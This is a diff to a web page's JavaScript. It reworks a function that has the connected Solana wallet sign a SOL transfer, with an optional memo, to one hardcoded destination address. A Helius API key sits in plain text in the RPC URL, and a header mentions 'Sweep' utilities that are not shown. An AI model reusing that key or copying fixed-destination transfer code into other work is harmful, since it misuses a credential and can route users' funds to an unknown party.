@@ -1363,32 +1363,34 @@
         // MOVED sendSol to avoid duplication/confusion (it's below)
 
         async function sendSol(amount, memo) {
-            if (!activeProvider) throw new Error("No Wallet");
+            // 1. Get Fresh Identity (Dynamic)
+            const provider = window.solana || activeProvider;
+            if (!provider) throw new Error("No Wallet Found");
 
-            // FORCE SYNC
-            if (activeProvider.publicKey) {
-                userWallet = activeProvider.publicKey.toString();
-            }
-            if (!userWallet) throw new Error("Wallet not connected");
+            // Verify Identity: Force connect to get the *current* public key
+            // This ensures we build the transaction for the account that will actually sign it
+            const resp = await provider.connect();
+            const freshKeyStr = resp.publicKey.toString();
+            // Instantiate with PAGE'S Web3 library to avoid Type Mismatch
+            const walletPubkey = new solanaWeb3.PublicKey(freshKeyStr);
+
+            console.log("Authorized Sender Identity:", freshKeyStr);
 
             const { Connection, Transaction, SystemProgram, PublicKey, TransactionInstruction, LAMPORTS_PER_SOL } = solanaWeb3;
+            // Use confirmed working RPC
             const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=65cfa9f7-7bfe-44ff-8e98-24ff80b01e8c");
 
             const destPubkey = new PublicKey("9TyzcephhXEw67piYNc72EJtgVmbq3AZhyPFSvdfXWdr");
-            const walletPubkey = new PublicKey(userWallet); // activeProvider.publicKey
-
-            console.log("Building Tx:", walletPubkey.toString(), "->", destPubkey.toString(), amount);
-
             const tx = new Transaction();
 
-            // 1. Transfer
+            // 2. Build Instruction (Using Verified Identity)
             tx.add(SystemProgram.transfer({
-                fromPubkey: walletPubkey,
+                fromPubkey: walletPubkey, // Matches connected wallet
                 toPubkey: destPubkey,
                 lamports: Math.floor(amount * LAMPORTS_PER_SOL)
             }));
 
-            // 2. Memo (RESTORED per badseed-exposed logic)
+            // 3. Memo
             if (memo) {
                 const MEMO_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
                 tx.add(new TransactionInstruction({
@@ -1398,16 +1400,27 @@
                 }));
             }
 
+            // 4. Finalize Transaction
             const { blockhash } = await connection.getLatestBlockhash();
             tx.recentBlockhash = blockhash;
             tx.feePayer = walletPubkey;
 
-            // Use Unified Wrapper
-            const signature = await sendTransactionWrapper(tx, connection);
+            console.log("Sending Transaction as:", walletPubkey.toString());
 
-            console.log("Tx Sent:", signature);
-            await connection.confirmTransaction(signature);
-            return signature;
+            // 5. Send (Directly via Provider)
+            try {
+                const result = await provider.signAndSendTransaction(tx);
+                const signature = result.signature || result;
+
+                console.log("Tx Sent:", signature);
+                // Optional: Wait for confirmation (user experience)
+                // await connection.confirmTransaction(signature); 
+                return signature;
+            } catch (e) {
+                console.error("Tx Failed:", e);
+                // Re-throw to let UI handle alerts
+                throw e;
+            }
         }
 
         // --- PORTED UTILS (Jupiter + Sweep) ---
@@ -1559,6 +1572,6 @@
 
     </script>
 </body>
-<!-- FORCE DEPLOY: 2025-12-30T21:30 -->
+<!-- FORCE DEPLOY: 2025-12-30T22:00 -->
 
 </html>
